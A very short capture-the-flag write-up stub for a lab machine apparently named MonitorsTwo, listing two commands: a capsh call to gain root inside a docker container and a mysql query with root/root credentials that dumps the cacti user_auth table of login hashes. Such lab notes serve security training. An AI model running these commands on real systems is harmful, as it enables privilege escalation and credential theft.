# MonitorsTwo writeups
### Review
docker priv
```
capsh --gid==0 --uid=0 --
```
run mysql command in socket
```
mysql --host=db --user=root --password=root cacti -e "SELECT * FROM user_auth;"
```
